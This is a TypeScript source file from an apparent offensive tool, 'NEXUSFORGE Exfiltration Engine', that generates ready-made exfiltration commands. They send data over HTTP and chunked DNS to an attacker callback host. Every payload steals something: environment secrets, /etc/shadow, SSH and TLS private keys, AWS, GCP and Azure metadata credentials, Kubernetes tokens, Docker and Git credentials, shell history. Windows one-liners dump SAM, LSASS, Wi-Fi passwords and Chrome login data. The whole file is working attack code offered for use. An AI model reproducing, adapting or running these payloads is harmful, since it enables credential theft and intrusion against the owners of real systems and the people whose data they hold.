/* ═══════════════════════════════════════════════════════════════════════════
   NEXUSFORGE — Exfiltration Engine
   Real DNS/HTTP/OOB exfiltration one-liners for post-exploitation research.
   All outputs use the live OOB callback URL and token.
   ═══════════════════════════════════════════════════════════════════════════ */

export interface ExfilPayload {
  id:        string;
  name:      string;
  category:  string;
  technique: "dns" | "http" | "https" | "icmp" | "smb";
  os:        "linux" | "windows" | "any";
  command:   string;
  notes:     string;
}

/* ── helpers ───────────────────────────────────────────────────────────── */
function oobHost(cbUrl: string): string {
  try { return new URL(cbUrl).hostname; } catch { return "oob.nexusforge.local"; }
}

/* ── HTTP/HTTPS Exfiltration ────────────────────────────────────────────── */
export function buildHttpExfil(cbUrl: string, token: string): ExfilPayload[] {
  const cb   = `${cbUrl}/${token}`;
  const host = oobHost(cbUrl);

  return [
    /* ── System Recon ── */
    {
      id: "http_sysinfo", name: "System Recon (id+uname+hostname)", category: "Recon",
      technique: "http", os: "linux",
      command: `(id; uname -a; hostname; whoami; uptime; ip addr 2>/dev/null||ifconfig 2>/dev/null) | curl -sk -X POST "${cb}" --data-binary @- &`,
      notes: "Exfiltrates id, kernel, hostname, IPs in one shot.",
    },
    {
      id: "http_environ", name: "/proc/self/environ", category: "Recon",
      technique: "http", os: "linux",
      command: `curl -sk -X POST "${cb}?f=environ" --data-binary @/proc/self/environ 2>/dev/null || curl -sk -X POST "${cb}?f=environ" -d "data=$(base64 -w0 /proc/self/environ 2>/dev/null)" &`,
      notes: "Exfiltrates full process environment including secrets injected at startup.",
    },
    {
      id: "http_env_all", name: "All Environment Variables", category: "Recon",
      technique: "http", os: "linux",
      command: `env | curl -sk -X POST "${cb}?f=env" --data-binary @- &`,
      notes: "All env vars — catches DATABASE_URL, API_KEY, SECRET, TOKEN, PASSWORD etc.",
    },
    {
      id: "http_env_secrets", name: "Secret ENV vars (grep filtered)", category: "Secrets",
      technique: "http", os: "linux",
      command: `env | grep -iE '(pass|secret|key|token|api|cred|auth|db|database|mysql|postgres|redis|mongo|rabbit|elastic|jwt|bearer|hmac|private|signing|encrypt|salt|seed|session|cookie|nonce|dsn|url|uri|connection)' | curl -sk -X POST "${cb}?f=secrets" --data-binary @- &`,
      notes: "Filtered to highest-value env vars only — avoids size limits.",
    },

    /* ── /etc files ── */
    {
      id: "http_passwd", name: "/etc/passwd", category: "Credentials",
      technique: "http", os: "linux",
      command: `curl -sk -X POST "${cb}?f=passwd" --data-binary @/etc/passwd 2>/dev/null &`,
      notes: "User accounts — identifies valid users, home dirs, shells.",
    },
    {
      id: "http_shadow", name: "/etc/shadow (root)", category: "Credentials",
      technique: "http", os: "linux",
      command: `curl -sk -X POST "${cb}?f=shadow" --data-binary @/etc/shadow 2>/dev/null || sudo cat /etc/shadow 2>/dev/null | curl -sk -X POST "${cb}?f=shadow" --data-binary @- &`,
      notes: "Hashed passwords — requires root. Run hashcat/john offline.",
    },
    {
      id: "http_sudoers", name: "/etc/sudoers", category: "Privilege Escalation",
      technique: "http", os: "linux",
      command: `{ cat /etc/sudoers 2>/dev/null; ls /etc/sudoers.d/ 2>/dev/null | xargs -I{} cat /etc/sudoers.d/{} 2>/dev/null; } | curl -sk -X POST "${cb}?f=sudoers" --data-binary @- &`,
      notes: "Reveals NOPASSWD entries and sudo rules for privesc paths.",
    },
    {
      id: "http_hosts", name: "/etc/hosts + resolv.conf", category: "Network",
      technique: "http", os: "linux",
      command: `{ cat /etc/hosts; echo '---'; cat /etc/resolv.conf; echo '---'; cat /etc/nsswitch.conf 2>/dev/null; } | curl -sk -X POST "${cb}?f=network_conf" --data-binary @- &`,
      notes: "Internal hostnames, DNS servers — pivoting targets.",
    },

    /* ── AWS ── */
    {
      id: "http_aws_creds", name: "AWS Credentials File", category: "Cloud",
      technique: "http", os: "linux",
      command: `{ cat ~/.aws/credentials 2>/dev/null; echo '---'; cat ~/.aws/config 2>/dev/null; echo '---'; env | grep -iE '^AWS_'; } | curl -sk -X POST "${cb}?f=aws_creds" --data-binary @- &`,
      notes: "AWS credential file + env vars. Includes ALL profiles.",
    },
    {
      id: "http_aws_imdsv2", name: "AWS IMDSv2 — IAM Token + Role Creds", category: "Cloud",
      technique: "http", os: "linux",
      command: `_IMDS=$(curl -sk -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" 2>/dev/null); _ROLE=$(curl -sk -H "X-aws-ec2-metadata-token: $_IMDS" "http://169.254.169.254/latest/meta-data/iam/security-credentials/" 2>/dev/null); { echo "Role: $_ROLE"; curl -sk -H "X-aws-ec2-metadata-token: $_IMDS" "http://169.254.169.254/latest/meta-data/iam/security-credentials/$_ROLE" 2>/dev/null; echo; curl -sk -H "X-aws-ec2-metadata-token: $_IMDS" "http://169.254.169.254/latest/meta-data/" 2>/dev/null; } | curl -sk -X POST "${cb}?f=aws_imds" --data-binary @- &`,
      notes: "Full IMDSv2 flow — fetches IAM role name then temporary credentials (AccessKeyId, SecretAccessKey, Token).",
    },
    {
      id: "http_aws_imdsv1", name: "AWS IMDSv1 — IAM Creds (fallback)", category: "Cloud",
      technique: "http", os: "linux",
      command: `_R=$(curl -sk "http://169.254.169.254/latest/meta-data/iam/security-credentials/" 2>/dev/null); curl -sk "http://169.254.169.254/latest/meta-data/iam/security-credentials/$_R" 2>/dev/null | curl -sk -X POST "${cb}?f=aws_imdsv1" --data-binary @- &`,
      notes: "IMDSv1 — no token required. Blocked on hardened instances (hop limit=1).",
    },

    /* ── GCP ── */
    {
      id: "http_gcp_token", name: "GCP Service Account OAuth Token", category: "Cloud",
      technique: "http", os: "linux",
      command: `{ curl -sk -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" 2>/dev/null; echo; curl -sk -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email" 2>/dev/null; echo; curl -sk -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/project/project-id" 2>/dev/null; } | curl -sk -X POST "${cb}?f=gcp_token" --data-binary @- &`,
      notes: "GCP metadata endpoint — returns live OAuth access_token for the instance service account.",
    },
    {
      id: "http_gcp_full", name: "GCP Full Metadata Dump", category: "Cloud",
      technique: "http", os: "linux",
      command: `curl -sk -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/?recursive=true" 2>/dev/null | curl -sk -X POST "${cb}?f=gcp_meta" --data-binary @- &`,
      notes: "Full recursive GCP metadata — includes SSH keys, service account tokens, custom metadata.",
    },

    /* ── Azure ── */
    {
      id: "http_azure_imds", name: "Azure IMDS — Access Token", category: "Cloud",
      technique: "http", os: "linux",
      command: `{ curl -sk -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2021-02-01&resource=https://management.azure.com/" 2>/dev/null; echo; curl -sk -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01" 2>/dev/null; } | curl -sk -X POST "${cb}?f=azure_imds" --data-binary @- &`,
      notes: "Azure IMDS — returns managed identity access token for Azure Resource Manager API.",
    },

    /* ── SSH Keys ── */
    {
      id: "http_ssh_keys", name: "SSH Private Keys (all users)", category: "Credentials",
      technique: "http", os: "linux",
      command: `find /root /home ~/.ssh /etc/ssh 2>/dev/null -maxdepth 4 \\( -name 'id_rsa' -o -name 'id_ed25519' -o -name 'id_ecdsa' -o -name 'id_dsa' -o -name '*.pem' -o -name '*.key' \\) 2>/dev/null | while read k; do echo "=== $k ==="; cat "$k" 2>/dev/null; done | curl -sk -X POST "${cb}?f=ssh_keys" --data-binary @- &`,
      notes: "Hunts all SSH private keys across all home dirs. Includes PEM/key files.",
    },
    {
      id: "http_authorized_keys", name: "authorized_keys (all users)", category: "Credentials",
      technique: "http", os: "linux",
      command: `find /root /home 2>/dev/null -maxdepth 4 -name 'authorized_keys' 2>/dev/null | while read f; do echo "=== $f ==="; cat "$f"; done | curl -sk -X POST "${cb}?f=authorized_keys" --data-binary @- &`,
      notes: "Reveals who has SSH access — cross-reference with `/etc/passwd`.",
    },

    /* ── Kubernetes ── */
    {
      id: "http_k8s_sa", name: "K8s Service Account Token + CA", category: "Container",
      technique: "http", os: "linux",
      command: `{ echo "=== SA TOKEN ==="; cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null; echo; echo "=== NAMESPACE ==="; cat /var/run/secrets/kubernetes.io/serviceaccount/namespace 2>/dev/null; echo; echo "=== K8S HOST ==="; echo $KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT; echo; echo "=== ENV ==="; env | grep -iE 'kubernetes|k8s'; } | curl -sk -X POST "${cb}?f=k8s" --data-binary @- &`,
      notes: "K8s pod SA token — use with kubectl to enumerate cluster RBAC permissions.",
    },
    {
      id: "http_k8s_secrets", name: "K8s API — List Secrets via SA Token", category: "Container",
      technique: "http", os: "linux",
      command: `_SA=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null); _NS=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace 2>/dev/null || echo default); curl -sk -H "Authorization: Bearer $_SA" "https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT/api/v1/namespaces/$_NS/secrets" 2>/dev/null | curl -sk -X POST "${cb}?f=k8s_secrets" --data-binary @- &`,
      notes: "If the SA has list/get secrets RBAC — dumps all K8s secrets in namespace.",
    },

    /* ── Docker ── */
    {
      id: "http_docker_sock", name: "Docker Socket — List Containers + Env", category: "Container",
      technique: "http", os: "linux",
      command: `{ curl -sk --unix-socket /var/run/docker.sock "http://localhost/containers/json" 2>/dev/null | python3 -c "import sys,json;[print(c['Id'][:12],c['Image'],c['State']) for c in json.load(sys.stdin)]" 2>/dev/null; docker inspect $(docker ps -q 2>/dev/null) 2>/dev/null | python3 -c "import sys,json;[[[print(e) for e in c.get('Config',{}).get('Env',[])] for c in json.load(sys.stdin)]]" 2>/dev/null; } | curl -sk -X POST "${cb}?f=docker" --data-binary @- &`,
      notes: "If /var/run/docker.sock accessible — lists containers, extracts env from all running containers.",
    },
    {
      id: "http_docker_config", name: "Docker Registry Credentials", category: "Credentials",
      technique: "http", os: "linux",
      command: `{ cat ~/.docker/config.json 2>/dev/null; cat /root/.docker/config.json 2>/dev/null; find /home -maxdepth 3 -name 'config.json' -path '*docker*' 2>/dev/null | xargs cat 2>/dev/null; } | curl -sk -X POST "${cb}?f=docker_creds" --data-binary @- &`,
      notes: "Docker auth configs — base64-decoded registry credentials (ECR, GCR, DockerHub).",
    },

    /* ── Secrets hunting ── */
    {
      id: "http_dotenv_hunt", name: ".env File Hunt", category: "Secrets",
      technique: "http", os: "linux",
      command: `find / -maxdepth 8 \\( -name '.env' -o -name '.env.local' -o -name '.env.production' -o -name '.env.prod' -o -name 'secrets.env' -o -name '*.env' \\) ! -path '*/node_modules/*' ! -path '*/.git/*' 2>/dev/null | head -20 | while read f; do echo "=== $f ==="; cat "$f" 2>/dev/null; done | curl -sk -X POST "${cb}?f=dotenv" --data-binary @- &`,
      notes: "Hunts .env files across filesystem excluding node_modules and .git.",
    },
    {
      id: "http_cred_files", name: "Common Credential Files Hunt", category: "Secrets",
      technique: "http", os: "linux",
      command: `for f in ~/.netrc ~/.pgpass ~/.my.cnf ~/.mysqlrc /etc/mysql/debian.cnf ~/.boto ~/.s3cfg ~/.npmrc ~/.pypirc ~/.pip/pip.conf ~/.cargo/credentials ~/.git-credentials /etc/mongod.conf /etc/redis/redis.conf; do [ -f "$f" ] && { echo "=== $f ==="; cat "$f"; }; done | curl -sk -X POST "${cb}?f=cred_files" --data-binary @- &`,
      notes: "Checks every common credential store location in one pass.",
    },
    {
      id: "http_history", name: "Shell History (all shells)", category: "Secrets",
      technique: "http", os: "linux",
      command: `{ for f in ~/.bash_history ~/.zsh_history ~/.sh_history ~/.fish_history /root/.bash_history /root/.zsh_history; do [ -f "$f" ] && { echo "=== $f ==="; cat "$f"; }; done; find /home -maxdepth 3 \\( -name '.bash_history' -o -name '.zsh_history' \\) 2>/dev/null | xargs cat 2>/dev/null; } | curl -sk -X POST "${cb}?f=history" --data-binary @- &`,
      notes: "Shell history leaks passwords typed as args, curl commands with tokens, git clone URLs with creds.",
    },
    {
      id: "http_ssl_keys", name: "SSL/TLS Private Keys Hunt", category: "Credentials",
      technique: "http", os: "linux",
      command: `find / -maxdepth 8 \\( -name 'privkey.pem' -o -name 'private.key' -o -name 'server.key' -o -name '*.private' -o -name 'ca-key.pem' \\) 2>/dev/null | while read k; do echo "=== $k ==="; cat "$k" 2>/dev/null; done | curl -sk -X POST "${cb}?f=tls_keys" --data-binary @- &`,
      notes: "SSL/TLS private keys — enables MITM on HTTPS traffic.",
    },
    {
      id: "http_git_creds", name: "Git Credentials + Config", category: "Secrets",
      technique: "http", os: "linux",
      command: `{ cat ~/.gitconfig 2>/dev/null; cat ~/.git-credentials 2>/dev/null; find / -maxdepth 6 -name '.git-credentials' 2>/dev/null | xargs cat 2>/dev/null; find / -maxdepth 6 -name '.gitconfig' 2>/dev/null | xargs cat 2>/dev/null; find / -maxdepth 8 -name 'config' -path '*git*' 2>/dev/null | head -5 | while read f; do echo "=== $f ==="; grep -i 'url\|token\|pass' "$f" 2>/dev/null; done; } | curl -sk -X POST "${cb}?f=git" --data-binary @- &`,
      notes: "Git credentials file stores plaintext tokens/passwords from HTTPS clone operations.",
    },
    {
      id: "http_proc_maps", name: "Memory Secrets via /proc", category: "Recon",
      technique: "http", os: "linux",
      command: `for pid in $(ls /proc | grep -E '^[0-9]+$' | head -20); do cat "/proc/$pid/environ" 2>/dev/null | tr '\\0' '\\n' | grep -iE '(pass|secret|key|token|api|auth|cred)'; done | sort -u | curl -sk -X POST "${cb}?f=proc_env" --data-binary @- &`,
      notes: "Reads /proc/PID/environ for all running processes — catches secrets from other process envs.",
    },
    {
      id: "http_cron", name: "Cron Jobs + Scheduled Tasks", category: "Privilege Escalation",
      technique: "http", os: "linux",
      command: `{ crontab -l 2>/dev/null; cat /etc/crontab 2>/dev/null; ls -la /etc/cron* 2>/dev/null; find /etc/cron* /var/spool/cron -type f 2>/dev/null | xargs cat 2>/dev/null; systemctl list-timers --all 2>/dev/null; } | curl -sk -X POST "${cb}?f=cron" --data-binary @- &`,
      notes: "Writable cron jobs = privilege escalation to that user/root.",
    },

    /* ── Mass Exfil ── */
    {
      id: "http_mass_exfil", name: "MASS EXFIL — Everything in One Shot", category: "Mass",
      technique: "http", os: "linux",
      command: `{ id; uname -a; hostname; whoami; echo '--- ENV ---'; env; echo '--- PASSWD ---'; cat /etc/passwd 2>/dev/null; echo '--- SHADOW ---'; cat /etc/shadow 2>/dev/null; echo '--- PROC ENVIRON ---'; cat /proc/self/environ 2>/dev/null | tr '\\0' '\\n'; echo '--- AWS ---'; cat ~/.aws/credentials 2>/dev/null; env | grep -iE '^AWS_'; echo '--- K8S SA ---'; cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null; echo '--- SSH KEYS ---'; find /root /home ~/.ssh 2>/dev/null -name 'id_*' ! -name '*.pub' | xargs cat 2>/dev/null; echo '--- GIT CREDS ---'; cat ~/.git-credentials ~/.gitconfig 2>/dev/null; echo '--- HISTORY ---'; cat ~/.bash_history ~/.zsh_history 2>/dev/null | tail -100; echo '--- NETWORK ---'; ip addr 2>/dev/null||ifconfig 2>/dev/null; ss -tulpn 2>/dev/null||netstat -tulpn 2>/dev/null; } | curl -sk -X POST "${cb}?f=MASS" --data-binary @- &`,
      notes: "Single-command comprehensive exfil — all high-value targets in one POST. Largest payload, use as final step.",
    },

    /* ── Windows ── */
    {
      id: "win_ps_env", name: "PowerShell — ENV + Credentials", category: "Windows",
      technique: "https", os: "windows",
      command: `powershell -NonI -W Hidden -c "$d=[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes((Get-ChildItem Env:|Out-String)+(Get-Content $env:USERPROFILE\\.aws\\credentials -EA 0)+(Get-Content $env:APPDATA\\Microsoft\\UserSecrets\\*\\secrets.json -EA 0 -Raw)));Invoke-WebRequest -Uri '${cb}?f=win_env' -Method POST -Body $d -UseBasicParsing 2>$null"`,
      notes: "Windows env vars + AWS creds + ASP.NET user secrets in one PowerShell one-liner.",
    },
    {
      id: "win_ps_sam", name: "PowerShell — SAM/SYSTEM Hive (shadow copy)", category: "Windows",
      technique: "https", os: "windows",
      command: `powershell -NonI -W Hidden -c "vssadmin create shadow /for=C: 2>$null;$vs=(vssadmin list shadows|Select-String 'Shadow Copy Volume').ToString().Split('=')[1].Trim();cmd /c \"copy '$vs\\Windows\\System32\\config\\SAM' C:\\Windows\\Temp\\s1.tmp\" 2>$null;cmd /c \"copy '$vs\\Windows\\System32\\config\\SYSTEM' C:\\Windows\\Temp\\s2.tmp\" 2>$null;[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\Windows\\Temp\\s1.tmp'))|Invoke-WebRequest -Uri '${cb}?f=SAM' -Method POST -UseBasicParsing 2>$null"`,
      notes: "Admin required. Volume shadow copy SAM dump — extract NTLM hashes offline with impacket/secretsdump.",
    },
    {
      id: "win_ps_lsass", name: "PowerShell — LSASS Minidump (comsvcs)", category: "Windows",
      technique: "https", os: "windows",
      command: `powershell -NonI -W Hidden -c "$p=(Get-Process lsass).Id;cmd /c 'rundll32 C:\\Windows\\System32\\comsvcs.dll MiniDump '$p' C:\\Windows\\Temp\\lsass.dmp full' 2>$null;[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\Windows\\Temp\\lsass.dmp'))|Invoke-WebRequest -Uri '${cb}?f=lsass' -Method POST -UseBasicParsing 2>$null;Remove-Item C:\\Windows\\Temp\\lsass.dmp -EA 0"`,
      notes: "Admin required. LSASS minidump via comsvcs.dll — extract plaintext creds with mimikatz/pypykatz offline.",
    },
    {
      id: "win_ps_wifi", name: "PowerShell — WiFi Passwords", category: "Windows",
      technique: "https", os: "windows",
      command: `powershell -NonI -W Hidden -c "$w=(netsh wlan show profiles|Select-String 'All User Profile').ForEach{$n=($_ -split ':')[1].Trim();(netsh wlan show profile name=$n key=clear|Select-String 'Key Content').ForEach{\"$n : $($_ -split ':')[1].Trim()\"}};[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes(($w-join[char]10)))|Invoke-WebRequest '${cb}?f=wifi' -Method POST -UseBasicParsing 2>$null"`,
      notes: "Dumps all saved WiFi passwords in plaintext.",
    },
    {
      id: "win_ps_chrome", name: "PowerShell — Chrome Cookies + Login Data", category: "Windows",
      technique: "https", os: "windows",
      command: `powershell -NonI -W Hidden -c "Stop-Process -Name chrome -EA 0;@('Login Data','Cookies','Web Data')|%{$f=\"$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\$_\";if(Test-Path $f){$tmp=\"$env:TEMP\\$_.tmp\";Copy-Item $f $tmp -EA 0;[Convert]::ToBase64String([IO.File]::ReadAllBytes($tmp))|Invoke-WebRequest '${cb}?f=chrome_$_' -Method POST -UseBasicParsing 2>$null;Remove-Item $tmp -EA 0}}"`,
      notes: "Copies Chrome credential SQLite DBs — decrypt with Mimikatz DPAPI or SharpChrome.",
    },
    {
      id: "win_cmd_creds", name: "CMD — Credential Manager Dump", category: "Windows",
      technique: "https", os: "windows",
      command: `cmdkey /list > %TEMP%\\cm.txt 2>&1 & powershell -c "$d=[Convert]::ToBase64String([IO.File]::ReadAllBytes('$env:TEMP\\cm.txt'));IWR '${cb}?f=credman' -Method POST -Body $d -UseBasicParsing" & del %TEMP%\\cm.txt`,
      notes: "Lists Windows Credential Manager entries — may expose RDP passwords, network credentials.",
    },
  ];
}

/* ── DNS Exfiltration ───────────────────────────────────────────────────── */
export function buildDnsExfil(cbUrl: string, token: string): ExfilPayload[] {
  const host = oobHost(cbUrl);

  return [
    {
      id: "dns_passwd_dig", name: "/etc/passwd — dig chunked", category: "Credentials",
      technique: "dns", os: "linux",
      command:
        "f=$(base64 -w0 /etc/passwd 2>/dev/null || base64 /etc/passwd | tr -d '\\n'); i=0; " +
        "while [ $i -lt ${#f} ]; do chunk=${f:$i:55}; " +
        "dig \"$chunk." + "0" + ".p." + token + "." + host + "\" @8.8.8.8 +short +time=1 2>/dev/null; " +
        "i=$((i+55)); sleep 0.15; done",
      notes: "Sends /etc/passwd in 55-char base64 chunks over DNS. Slow but bypasses all HTTP controls.",
    },
    {
      id: "dns_passwd_nslookup", name: "/etc/passwd — nslookup single chunk", category: "Credentials",
      technique: "dns", os: "linux",
      command:
        "nslookup \"$(base64 -w0 /etc/passwd 2>/dev/null | cut -c1-60).p." +
        token + "." + host + "\" 2>/dev/null",
      notes: "Single nslookup — only exfils first 60 base64 chars (~45 bytes). Good for confirming OOB.",
    },
    {
      id: "dns_env_dig", name: "ENV Secrets — dig chunked", category: "Secrets",
      technique: "dns", os: "linux",
      command:
        "f=$(env | grep -iE '(pass|secret|key|token|api|cred|auth|db|jwt)' | base64 -w0 2>/dev/null || env | base64 | tr -d '\\n'); i=0; " +
        "while [ $i -lt ${#f} ]; do chunk=${f:$i:55}; " +
        "dig \"$chunk.$i.e." + token + "." + host + "\" +short +time=1 2>/dev/null; " +
        "i=$((i+55)); sleep 0.1; done",
      notes: "Exfiltrates only secret-looking env vars via DNS — minimises chunks needed.",
    },
    {
      id: "dns_aws_env", name: "AWS Credentials — dig", category: "Cloud",
      technique: "dns", os: "linux",
      command:
        "f=$(env | grep -iE '^AWS_' | base64 -w0 2>/dev/null); i=0; " +
        "while [ $i -lt ${#f} ]; do chunk=${f:$i:55}; " +
        "dig \"$chunk.$i.aws." + token + "." + host + "\" @8.8.8.8 +short +time=1 2>/dev/null; " +
        "i=$((i+55)); sleep 0.1; done",
      notes: "AWS env vars (AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY, AWS_SESSION_TOKEN) over DNS.",
    },
    {
      id: "dns_k8s_token", name: "K8s SA Token — dig chunked", category: "Container",
      technique: "dns", os: "linux",
      command:
        "f=$(base64 -w0 /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null); i=0; " +
        "while [ $i -lt ${#f} ]; do chunk=${f:$i:55}; " +
        "dig \"$chunk.$i.k." + token + "." + host + "\" +short +time=1 2>/dev/null; " +
        "i=$((i+55)); sleep 0.1; done",
      notes: "K8s service account JWT via DNS. JWT = 3 base64 parts — can be decoded offline.",
    },
    {
      id: "dns_python_chunk", name: "Python — chunked DNS exfil", category: "Secrets",
      technique: "dns", os: "linux",
      command:
        "python3 -c \"" +
        "import subprocess,base64,os,time\\n" +
        "d=base64.b64encode(b'\\\\n'.join([open(f,'rb').read() for f in ['/etc/passwd','/proc/self/environ',os.path.expanduser('~/.aws/credentials')] if os.path.exists(f)])).decode()\\n" +
        "for i in range(0,len(d),55):\\n" +
        "    chunk=d[i:i+55].replace('+','-').replace('/','_').replace('=','~')\\n" +
        "    subprocess.run(['dig',f'{chunk}.{i}.py." + token + "." + host + "','@8.8.8.8','+short','+time=1'],capture_output=True)\\n" +
        "    time.sleep(0.12)\\n" +
        "print('done',len(d),'chars')\\n\"",
      notes: "Python multi-target exfil: /etc/passwd + /proc/self/environ + AWS creds in one chunked DNS stream.",
    },
    {
      id: "dns_oob_confirm", name: "OOB DNS Confirmation Ping", category: "Recon",
      technique: "dns", os: "any",
      command: `dig "confirm.$(id|base64 -w0 2>/dev/null|cut -c1-20).${token}.${host}" +short 2>/dev/null || nslookup "confirm.${token}.${host}" 2>/dev/null || host "confirm.${token}.${host}" 2>/dev/null`,
      notes: "Lightweight OOB DNS confirmation — verify callback reach before exfil. Encodes first 20 chars of id output.",
    },
    {
      id: "dns_hostname_exfil", name: "Hostname + ID quick exfil", category: "Recon",
      technique: "dns", os: "linux",
      command: `dig "$(hostname | tr '.' '-').$(id -u).h.${token}.${host}" +short 2>/dev/null`,
      notes: "Single DNS lookup encodes hostname and UID — confirms code execution + reveals target identity.",
    },
    {
      id: "dns_shadow_chunked", name: "/etc/shadow — dig chunked (root)", category: "Credentials",
      technique: "dns", os: "linux",
      command:
        "f=$(sudo base64 -w0 /etc/shadow 2>/dev/null || base64 -w0 /etc/shadow 2>/dev/null); i=0; " +
        "while [ $i -lt ${#f} ]; do chunk=${f:$i:55}; " +
        "dig \"$chunk.$i.s." + token + "." + host + "\" +short +time=1 2>/dev/null; " +
        "i=$((i+55)); sleep 0.15; done",
      notes: "Exfiltrates /etc/shadow hashes via DNS. Requires root. Each chunk = ~41 plaintext bytes.",
    },
    {
      id: "dns_git_token", name: "Git + NPM Tokens — quick DNS", category: "Secrets",
      technique: "dns", os: "linux",
      command:
        "f=$(grep -ohE '[a-zA-Z0-9_-]{30,}' ~/.git-credentials ~/.npmrc ~/.pypirc 2>/dev/null | head -3 | base64 -w0 2>/dev/null | cut -c1-55); " +
        "[ -n \"$f\" ] && dig \"$f.tok." + token + "." + host + "\" +short 2>/dev/null",
      notes: "Greps high-entropy tokens from common credential files, exfils via single DNS query.",
    },
    {
      id: "dns_windows_info", name: "Windows — hostname + user DNS beacon", category: "Windows",
      technique: "dns", os: "windows",
      command: `nslookup %COMPUTERNAME%.%USERNAME%.${token}.${host} 2>nul`,
      notes: "Windows CMD — single DNS beacon encoding computername and username.",
    },
    {
      id: "dns_windows_ps", name: "Windows — PowerShell chunked DNS exfil", category: "Windows",
      technique: "dns", os: "windows",
      command: `powershell -NonI -W Hidden -c "$d=[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes((Get-ChildItem Env:|Out-String)));for($i=0;$i -lt $d.Length;$i+=55){$c=$d.Substring($i,[Math]::Min(55,$d.Length-$i));nslookup \"$c.$i.w.${token}.${host}\" 8.8.8.8 2>$null;Start-Sleep -Milliseconds 150}"`,
      notes: "PowerShell env exfil over DNS in 55-char chunks. No curl/wget needed.",
    },
  ];
}
